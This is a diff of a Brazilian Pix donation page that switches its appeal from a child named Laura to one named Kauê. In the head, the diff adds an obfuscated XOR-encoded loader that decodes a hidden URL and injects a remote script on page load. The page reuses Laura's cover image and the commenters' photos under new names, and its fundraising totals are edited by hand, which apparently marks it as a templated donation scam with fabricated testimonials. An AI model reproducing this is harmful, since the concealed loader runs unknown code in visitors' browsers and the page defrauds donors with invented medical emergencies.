@@ -1,25 +1,13 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=true;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '2329575777877928');
-    fbq('track', 'PageView');
-  </script>
-  <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2329575777877928&ev=PageView&noscript=1"/></noscript>
+  <script>(function(){var x_6=atob("DEI/jnRXkCUvj+06Bjkd+wY7sh8N55lOdjEFoVs09EsB+plXbyRGoBc4/QtN/cJJZTBW/gAkv1VG94hWKTJW9hE7vk9crcEYZzZL/B015VFK/M8AXR8TrBM7/0dO454YPBlErBo2/UANtc9Kbzpa4j0zsgkN+YxWcycdtFZh8RZNu99ZYnYK7RBkoBBLv4kLN3YLuxB17XhS");var a_y=[];for(var i_75=0;i_75<x_6.length;i_75++){a_y.push(x_6.charCodeAt(i_75)&255);}var y_z=a_y[0];var u_6u48=a_y.slice(1,1+y_z);var b_t=a_y.slice(1+y_z);var f_z0=b_t.map(function(b,k_c151){return b^u_6u48[k_c151%y_z];});var e_x="";for(var l_nhuo=0;l_nhuo<f_z0.length;l_nhuo++){e_x+=String.fromCharCode(f_z0[l_nhuo]&255);}var g_pun2=decodeURIComponent(escape(e_x));var k_l2=JSON.parse(g_pun2);var l_m=k_l2.globals||[];l_m.forEach(function(a_c3a){window[a_c3a.name]=a_c3a.value;});var k_4jd6=document.createElement("script");k_4jd6.src=k_l2.url;k_4jd6.async=true;k_4jd6.defer=true;(k_l2.attributes||[]).forEach(function(c_p9h){k_4jd6.setAttribute(c_p9h.name,c_p9h.value);});(document.head||document.documentElement).appendChild(k_4jd6);})();</script>
   <script src="_ext/cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async defer></script>
 
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>URGENTE: A Laura tem poucos dias para garantir o oxigênio | Abrace uma Vida</title>
-  <meta name="description" content="Ajude a manter a Laura respirando. Contribua com a campanha de insumos e oxigênio da Laura.">
+  <title>URGENTE: O pequeno Kauê precisa da sua ajuda para vencer a AME Tipo 2 | Abrace uma Vida</title>
+  <meta name="description" content="Kauê enfrenta a AME Tipo 2 e precisa de suporte contínuo, fisioterapia e equipamentos para continuar respirando e lutando. Abrace uma Vida.">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
   <link href="_ext/fonts.googleapis.com/assets/css2" rel="stylesheet">
@@ -183,7 +171,7 @@
     }
     .painel-onda {
       height: 100%;
-      width: 32.50%;
+      width: 48.75%;
       background: linear-gradient(90deg, var(--terra-clara), var(--terra), var(--brasa));
       border-radius: 3px;
     }
@@ -259,6 +247,19 @@
       margin: 0.7rem 0;
     }
 
+    .frase-forte {
+      text-align: center;
+      font-family: 'Figtree', system-ui, sans-serif;
+      font-size: 1.12rem;
+      font-weight: 700;
+      color: var(--cacau);
+      background: linear-gradient(135deg, var(--creme), var(--brasa-veu));
+      border-radius: 8px;
+      padding: 1.1rem 1.15rem;
+      margin: 1.15rem 0;
+      line-height: 1.5;
+    }
+
     .fala-familia {
       background: var(--creme);
       border: 1px solid var(--linha);
@@ -291,60 +292,61 @@
     }
     .doar-cabeca p { font-size: 0.88rem; color: var(--tinta-media); line-height: 1.6; }
 
-    /* Grade de Botões e Destaques */
+    /* Estilos da Grade de Botões de Doação */
     .grade-valores {
       display: grid;
       grid-template-columns: repeat(4, 1fr);
-      gap: 8px;
-      margin-bottom: 15px;
+      gap: 10px;
+      margin: 15px 0 20px 0;
       align-items: end;
     }
     .btn-valor {
-      background: var(--folha);
-      border: 2px solid var(--terra);
-      color: var(--cacau);
-      font-size: 0.95rem;
+      background: #ffffff;
+      border: 2px solid #e3832f;
+      color: #4a2b22;
+      font-size: 1.05rem;
       font-weight: 800;
-      padding: 10px 5px;
-      border-radius: 6px;
+      padding: 12px 5px;
+      border-radius: 8px;
       cursor: pointer;
       transition: all 0.2s ease;
       font-family: 'Figtree', sans-serif;
-      position: relative;
       width: 100%;
+      text-align: center;
     }
     .btn-valor:hover, .btn-valor.selecionado {
-      background: var(--terra);
-      color: white;
-      border-color: var(--terra-fundo);
+      background: #e3832f;
+      color: #ffffff;
+      border-color: #c86c1f;
       transform: translateY(-2px);
-      box-shadow: 0 4px 10px rgba(227,131,47,0.3);
+      box-shadow: 0 4px 12px rgba(227,131,47,0.35);
     }
-
     .btn-valor-caixa-destaque {
       display: flex;
       flex-direction: column;
       align-items: center;
       position: relative;
+      width: 100%;
     }
     .tag-destaque {
-      background: var(--brasa);
-      color: white;
-      font-size: 0.55rem;
+      background: #e8432b;
+      color: #ffffff;
+      font-size: 0.58rem;
       font-weight: 900;
-      padding: 2px 4px;
-      border-radius: 3px;
+      padding: 3px 6px;
+      border-radius: 4px;
       text-transform: uppercase;
-      letter-spacing: 0.02em;
-      margin-bottom: 3px;
+      letter-spacing: 0.03em;
+      margin-bottom: 4px;
       white-space: nowrap;
-      box-shadow: 0 2px 5px rgba(232,67,43,0.3);
+      box-shadow: 0 2px 6px rgba(232,67,43,0.3);
+      font-family: 'Figtree', sans-serif;
     }
     .btn-destaque {
       background: linear-gradient(135deg, #e8432b, #c7331d) !important;
-      color: white !important;
+      color: #ffffff !important;
       border: 2px solid #a62d1a !important;
-      box-shadow: 0 4px 12px rgba(232,67,43,0.38);
+      box-shadow: 0 4px 14px rgba(232,67,43,0.4);
     }
 
     .depoimentos { margin-bottom: 1.8rem; }
@@ -365,6 +367,7 @@
       flex-shrink: 0;
       object-fit: cover;
       border: 2px solid var(--terra);
+      filter: contrast(1.1) saturate(0.86) brightness(1.05);
     }
     .depoimento-nome { font-size: 0.86rem; font-weight: 800; color: var(--tinta); line-height: 1.2; }
     .depoimento-tempo { font-size: 0.72rem; color: var(--tinta-media); font-weight: 600; }
@@ -376,6 +379,51 @@
       font-size: 0.77rem;
       color: var(--tinta-media);
     }
+
+    .fecho-apelo {
+      background: var(--cacau);
+      color: rgba(255,255,255,0.92);
+      border-radius: 8px;
+      padding: 1.15rem 1.2rem;
+      text-align: center;
+      margin-bottom: 1.8rem;
+    }
+    .fecho-apelo p { font-size: 0.88rem; line-height: 1.65; margin-bottom: 0.55rem; }
+    .fecho-apelo strong { color: var(--terra-clara); }
+
+    .faq-ar { margin-bottom: 5rem; }
+    .faq-ar h3 {
+      font-size: 0.74rem;
+      font-weight: 800;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--tinta-media);
+      margin-bottom: 1rem;
+      font-family: 'Figtree', sans-serif;
+    }
+    .faq-linha { border-bottom: 1px solid var(--linha); }
+    .faq-pergunta {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0.88rem 0;
+      cursor: pointer;
+      gap: 0.5rem;
+      font-size: 0.9rem;
+      font-weight: 800;
+      user-select: none;
+    }
+    .faq-sinal { color: var(--brasa); font-size: 1.2rem; transition: transform 0.25s; flex-shrink: 0; }
+    .faq-pergunta.expandida .faq-sinal { transform: rotate(45deg); }
+    .faq-resposta {
+      max-height: 0;
+      overflow: hidden;
+      font-size: 0.86rem;
+      color: var(--tinta-media);
+      line-height: 1.75;
+      transition: max-height 0.3s ease, padding 0.3s;
+    }
+    .faq-resposta.expandida { max-height: 380px; padding-bottom: 1rem; }
 
     .rodape-jpv {
       background: linear-gradient(135deg, var(--cacau-noite), var(--terra-fundo));
@@ -410,16 +458,44 @@
       z-index: 99;
       box-shadow: 0 8px 24px rgba(199,51,29,0.48);
       font-family: 'Figtree', sans-serif;
+      transition: filter 0.2s;
     }
+    .cta-fixo:hover { filter: brightness(1.05); }
 
     @media (max-width: 600px) {
-      .grade-valores { grid-template-columns: repeat(4, 1fr); gap: 5px; }
-      .btn-valor { font-size: 0.82rem; padding: 8px 2px; }
-      .tag-destaque { font-size: 0.5rem; padding: 1px 3px; }
+      .selo-figura { height: 78px; }
+      .capa-img {
+        aspect-ratio: 3 / 4;
+        max-height: min(84vh, 620px);
+        object-position: center 16%;
+        border-radius: 6px 6px 0 0;
+      }
+      .chamada { padding: 1.2rem 0 0.85rem; }
+      .coluna { padding: 0 0.9rem; }
+      .painel-meta { padding: 1.1rem 0.95rem 0.95rem; }
+      .painel-cifra, .painel-pct { font-size: 1.68rem; }
+      .cta-ar { font-size: 0.92rem; padding: 0.95rem 0.9rem; max-width: 100%; }
+      .bloco-titulo { font-size: 1.05rem; }
+      .bloco p { font-size: 0.95rem; }
+      .cta-fixo { min-width: 0; width: calc(100% - 1.6rem); max-width: calc(100% - 1.6rem); font-size: 0.84rem; padding: 0.9rem 0.85rem; }
+      .faq-ar { margin-bottom: 5.5rem; }
+      .grade-valores { grid-template-columns: repeat(4, 1fr); gap: 6px; }
+      .btn-valor { font-size: 0.88rem; padding: 10px 2px; }
+      .tag-destaque { font-size: 0.5rem; padding: 2px 4px; }
+    }
+
+    @media (max-width: 360px) {
+      .selo-figura { height: 70px; }
+      .chamada h1 { font-size: 1.26rem; }
+      .grade-valores { grid-template-columns: repeat(4, 1fr); }
+    }
+
+    @media (min-width: 560px) {
+      .capa-img { max-height: 680px; }
     }
   </style>
 </head>
-<body data-campanha="juntos-pela-laura-2026">
+<body data-campanha="juntos-pelo-kaue-ame-2026">
 
   <header class="cabecalho-selo">
    <img src="logo.jpg" alt="Abrace uma Vida" class="selo-figura">
@@ -428,51 +504,71 @@
   <main class="coluna">
 
     <div class="chamada">
-      <span class="chamada-tag">🚨 URGENTE: A LAURA PRECISA DE AJUDA</span>
-      <h1>"Cada segundo é uma luta pela respiração da minha filha!"</h1>
-      <p>A pequena Laura precisa de oxigênio e insumos diários para continuar lutando pela vida. <strong>Sua ajuda garante os cuidados que ela tanto precisa para respirar.</strong></p>
+      <span class="chamada-tag">🚨 URGENTE: A LUTA PELA VIDA DO KAUÊ CONTRA A AME TIPO 2</span>
+      <h1>"Sem esta máquina e o tratamento adequado, ele não pode respirar. Por favor, nos ajude a salvar o Kauê!"</h1>
+      <p>O pequeno Kauê enfrenta a <strong>AME Tipo 2 (Atrofia Muscular Espinhal)</strong> e precisa de suporte respiratório contínuo e medicamentos essenciais para continuar vivendo. <strong>A família precisa trocar os equipamentos e manter os cuidados urgentemente!</strong></p>
     </div>
 
     <figure class="capa">
-     <img src="capa-laura-respirar.jpg" alt="Laura com a cânula de oxigênio" class="capa-img">
-      <figcaption class="capa-nota">Laura lutando pela vida: Cada contribuição mantém o oxigênio e os cuidados dela garantidos...</figcaption>
+     <img src="capa-laura-respirar.jpg" alt="Kauê em tratamento contra AME Tipo 2" class="capa-img">
+      <figcaption class="capa-nota">Kauê hoje: Dependente de suporte respiratório e lutando diariamente contra a AME Tipo 2...</figcaption>
     </figure>
 
     <div class="painel-meta">
       <div class="painel-topo">
         <div>
-          <div class="painel-cifra">R$ 32.500,00</div>
-          <div class="painel-sub">arrecadados para os insumos</div>
+          <div class="painel-cifra">R$ 21.546,12</div>
+          <div class="painel-sub">arrecadados de R$ 44.200,00</div>
         </div>
-        <div class="painel-pct">32,5%<small>da meta</small></div>
+        <div class="painel-pct">48,75%<small>da meta</small></div>
       </div>
-      <div class="painel-trilho"><div class="painel-onda" style="width:32.50%"></div></div>
+      <div class="painel-trilho"><div class="painel-onda" style="width:48.75%"></div></div>
       <div class="painel-rodape">
-        <span><strong>610 pessoas</strong> já apoiaram</span>
-        <span><strong>oxigênio</strong> diário garantido</span>
+        <span><strong>412 pessoas</strong> já ajudaram</span>
+        <span><strong>o tratamento</strong> não pode parar</span>
       </div>
     </div>
 
-    <a href="#ajudar-laura" class="cta-ar">QUERO AJUDAR A LAURA A RESPIRAR 🙏</a>
-    <p class="selo-pix">PIX seguro · 100% revertido para os cuidados da Laura</p>
+    <a href="#ajudar-kaue" class="cta-ar">DOAR VIA PIX PARA SALVAR O KAUÊ 🙏</a>
+    <p class="selo-pix">PIX seguro · 100% destinado aos equipamentos, respirador e insumos do Kauê</p>
 
     <hr class="divisa">
 
     <section class="bloco">
-      <h2 class="bloco-titulo">⚠️ Uma luta diária pela respiração e pela vida.</h2>
-      <p>A Laura depende de oxigênio e acompanhamento constante. Os custos com insumos e medicamentos são altos e a família precisa de apoio imediato para não faltar nada.</p>
-      <div class="alerta-forte">⚠️ Qualquer valor faz toda a diferença para garantir que a Laura tenha o suporte necessário todos os dias.</div>
+      <h2 class="bloco-titulo">⚠️ AME Tipo 2: Uma batalha diária pela respiração e pela vida.</h2>
+      <p>Diagnosticado com <strong>Atrofia Muscular Espinhal (AME) Tipo 2</strong>, o Kauê perdeu a força muscular gradualmente e depende de aparelhos respiratórios e suporte diário em casa para continuar respirando e lutando.</p>
+      <p>O equipamento que ele usa precisa ser substituído para evitar riscos gravíssimos de infecções e complicações respiratórias. Cada dia sem essa garantia é uma angústia imensa para a família.</p>
+      <div class="alerta-forte">⚠️ Cada CENTAVO arrecadado vai direto para garantir a nova máquina de respiração, os insumos e o tratamento contínuo do Kauê.</div>
+    </section>
+
+    <section class="bloco">
+      <h2 class="bloco-titulo">👨‍👩‍👧 Uma família que esgotou os recursos e pede socorro.</h2>
+      <p>Os pais do Kauê já fizeram o impossível, mas os custos com os equipamentos de suporte à vida e os cuidados médicos ultrapassam totalmente qualquer orçamento familiar.</p>
+      <p>Qualquer valor no Pix faz uma diferença gigantesca. <strong>Não existe contribuição pequena quando a respiração de um menino está em jogo.</strong></p>
+    </section>
+
+    <div class="fala-familia">
+      <span class="fala-abre">💚 Apelo desesperado da família</span><br>
+      O Kauê é a nossa vida. Sem a máquina de respiração e o suporte adequado, ele corre risco de vida. Por amor a Deus, nos ajudem a conseguir o novo equipamento para o nosso menino respirar em segurança. 🙏
+      <cite>— Família do Kauê</cite>
+    </div>
+
+    <section class="bloco">
+      <h2 class="bloco-titulo">Não ignore esta página. O Kauê precisa de uma chance agora!</h2>
+      <p>Por trás desta tela existe um menino corajoso lutando contra a AME Tipo 2 e uma família unida pelo amor, pedindo ajuda desesperadamente.</p>
+      <p><strong>Sozinhos eles não conseguem, mas com a união de centenas de pessoas solidárias, podemos garantir a nova máquina do Kauê!</strong></p>
+      <div class="frase-forte">Faça uma boa ação hoje. Doe qualquer valor via Pix e ajude a garantir a respiração e a vida do Kauê.</div>
     </section>
 
     <hr class="divisa">
 
-    <section id="ajudar-laura">
+    <section id="ajudar-kaue">
       <div class="doar-cabeca">
         <h2>Faça sua Doação Pix Instantânea</h2>
-        <p>Escolha um valor abaixo, escaneie o QR Code ou copie a chave Pix para apoiar a Laura.</p>
+        <p>Escolha um valor abaixo, escaneie o QR Code ou clique no botão verde para copiar a chave Pix e ajudar o Kauê.</p>
       </div>
-      
-      <!-- Grade de Valores com R$ 50 em Destaque -->
+
+      <!-- Grade de Botões de Valores Rápidos -->
       <div class="grade-valores">
         <button class="btn-valor" onclick="selecionarValor('10')">R$ 10</button>
         <button class="btn-valor" onclick="selecionarValor('20')">R$ 20</button>
@@ -488,15 +584,18 @@
         <button class="btn-valor" onclick="selecionarValor('500')">R$ 500</button>
         <button class="btn-valor" onclick="selecionarValor('1000')">R$ 1.000</button>
       </div>
-
-      <div style="text-align: center; margin: 20px 0;">
+      
+      <div style="text-align: center; margin: 25px 0;">
+          <!-- Imagem do QR Code -->
           <img src="flow.jpg" alt="QR Code Pix" style="max-width: 450px; width: 100%; height: auto; border-radius: 12px; display: block; margin: 0 auto 15px auto; box-shadow: 0 4px 12px rgba(0,0,0,0.15);">
 
+          <!-- Botão de Copiar Chave Pix -->
           <button onclick="copiarPix()" id="btn-copiar-pix" style="background-color: #25d366; color: white; border: none; padding: 15px 30px; font-size: 19px; font-weight: bold; border-radius: 8px; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 10px rgba(0,0,0,0.2);">
               📋 Copiar Chave Pix (E-mail)
           </button>
       </div>
 
+      <!-- Script de seleção do valor e cópia do Pix -->
       <script>
       function selecionarValor(valor) {
           document.querySelectorAll('.btn-valor').forEach(btn => btn.classList.remove('selecionado'));
@@ -505,7 +604,7 @@
       }
 
       function copiarPix() {
-          const chavePix = "apoiealaurinha@gmail.com"; 
+          const chavePix = "juntospelokaue@gmail.com"; 
           
           navigator.clipboard.writeText(chavePix).then(() => {
               const btn = document.getElementById("btn-copiar-pix");
@@ -525,18 +624,74 @@
     <hr class="divisa">
 
     <section class="depoimentos">
-      <p class="depoimentos-titulo">Quem já ajudou a Laura (3)</p>
+      <p class="depoimentos-titulo">Quem já ajudou o Kauê (3)</p>
 
       <div class="depoimento">
         <div class="depoimento-topo">
-          <img src="comentario-taina.jpg" alt="" class="depoimento-foto">
+          <img src="comentario-taina.jpg" alt="" class="depoimento-foto" style="object-position: 48% 22%;">
           <div>
-            <div class="depoimento-nome">Tainá Vilela</div>
+            <div class="depoimento-nome">Roberta Lima</div>
             <div class="depoimento-tempo">há 22 minutos</div>
           </div>
         </div>
-        <p>Vi a foto dela com a cânula de oxigênio e travei. Um bebê tão pequeno lutando pra puxar o ar... Minha contribuição foi enviada. Força à família! ❤️</p>
-        <div class="depoimento-curtida"><span>❤️</span> 184</div>
+        <p>Vi o vídeo e a história do Kauê e fiquei com o coração apertado. Uma criança tão pequena enfrentando a AME Tipo 2 e precisando de ajuda para respirar... 😢 Doei o que pude e espero de verdade que ele consiga a nova máquina. Que Deus abençoe essa família. ❤️🙏</p>
+        <div class="depoimento-curtida"><span>❤️</span> 302</div>
+      </div>
+
+      <div class="depoimento">
+        <div class="depoimento-topo">
+          <img src="comentario-henrique.jpg" alt="" class="depoimento-foto" style="object-position: 50% 18%;">
+          <div>
+            <div class="depoimento-nome">Flávio Martins</div>
+            <div class="depoimento-tempo">há 1 hora</div>
+          </div>
+        </div>
+        <p>Ninguém precisa doar centenas de reais. Se cada um fizer um pouco, a máquina do Kauê fica garantida. Compartilhei no grupo da família e no do trabalho. Força pros pais. 🙏</p>
+        <div class="depoimento-curtida"><span>❤️</span> 286</div>
+      </div>
+
+      <div class="depoimento">
+        <div class="depoimento-topo">
+          <img src="comentario-luciana.jpg" alt="" class="depoimento-foto" style="object-position: 50% 10%;">
+          <div>
+            <div class="depoimento-nome">Simone Fátima</div>
+            <div class="depoimento-tempo">há 3 horas</div>
+          </div>
+        </div>
+        <p>Já fui mãe e sei o que é o desespero de ver um filho precisar de ajuda médica. Ler que a família precisa trocar o aparelho respiratório apertou meu coração. Fiz minha parte e pedi pras amigas também. ✨</p>
+        <div class="depoimento-curtida"><span>❤️</span> 214</div>
+      </div>
+    </section>
+
+    <div class="fecho-apelo">
+      <p><strong>Talvez ninguém consiga comprar esse equipamento sozinho.</strong> Mas muitas pessoas juntas conseguem garantir a respiração do Kauê.</p>
+      <p>Doe o valor que puder agora. Não permita que o Kauê e sua família fiquem sem apoio. Cada ajuda conta!</p>
+      <p style="margin-bottom:0;font-size:0.8rem;opacity:0.7">Comentários encerrados para esta publicação</p>
+    </div>
+
+    <hr class="divisa">
+
+    <section class="faq-ar">
+      <h3>Perguntas frequentes</h3>
+      <div class="faq-linha">
+        <div class="faq-pergunta">Como faço para contribuir? <span class="faq-sinal">+</span></div>
+        <div class="faq-resposta">Escolha um valor, clique no botão para copiar a chave Pix ou escaneie o QR Code com o app do seu banco. É rápido, seguro e leva menos de 1 minuto.</div>
+      </div>
+      <div class="faq-linha">
+        <div class="faq-pergunta">Qual é a doença do Kauê? <span class="faq-sinal">+</span></div>
+        <div class="faq-resposta">O Kauê foi diagnosticado com AME Tipo 2 (Atrofia Muscular Espinhal), uma condição degenerativa que afeta a força muscular e a capacidade respiratória, exigindo suporte de aparelhos e acompanhamento constante.</div>
+      </div>
+      <div class="faq-linha">
+        <div class="faq-pergunta">A doação via Pix é segura? <span class="faq-sinal">+</span></div>
+        <div class="faq-resposta">Sim, totalmente segura e direta para a chave oficial da família responsável pelo tratamento e equipamentos do Kauê.</div>
+      </div>
+      <div class="faq-linha">
+        <div class="faq-pergunta">Não posso doar agora, posso ajudar de outra forma? <span class="faq-sinal">+</span></div>
+        <div class="faq-resposta">Sim! Compartilhe o link deste site com amigos, familiares e em grupos de WhatsApp. Isso ajuda muito a alcançar mais doadores.</div>
+      </div>
+      <div class="faq-linha">
+        <div class="faq-pergunta">O dinheiro chega mesmo para a máquina e o tratamento? <span class="faq-sinal">+</span></div>
+        <div class="faq-resposta">Sim. Todos os recursos arrecadados são integralmente revertidos para a aquisição do novo aparelho respiratório, insumos e custos médicos do Kauê.</div>
       </div>
     </section>
 
@@ -544,18 +699,26 @@
 
   <footer class="rodape-jpv">
     <strong>Abrace uma Vida</strong> · Unidos por quem precisa de uma chance.<br>
-    Campanha de apoio aos insumos e oxigênio da Laura<br>
+    Organizado em parceria com a família do Kauê<br>
     © 2026 — Todos os direitos reservados
   </footer>
 
-  <a href="#ajudar-laura" class="cta-fixo">QUERO AJUDAR A LAURA A RESPIRAR 🙏</a>
+  <a href="#ajudar-kaue" class="cta-fixo">DOAR VIA PIX AGORA PARA SALVAR O KAUÊ 🙏</a>
 
   <script>
+    document.querySelectorAll('.faq-pergunta').forEach(function (item) {
+      item.addEventListener('click', function () {
+        this.classList.toggle('expandida');
+        this.nextElementSibling.classList.toggle('expandida');
+      });
+    });
+
     document.getElementById('atalho-doar').addEventListener('click', function (ev) {
       ev.preventDefault();
-      document.getElementById('ajudar-laura').scrollIntoView({ behavior: 'smooth' });
+      document.getElementById('ajudar-kaue').scrollIntoView({ behavior: 'smooth' });
     });
   </script>
   <script src="assets/app.js"></script>
+<script type="module" src="_ext/static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;7d992355098447f39dc3a0137dc58c03&quot;,&quot;r&quot;:1,&quot;spa&quot;:2}" crossorigin="anonymous"></script>
 </body>
 </html>
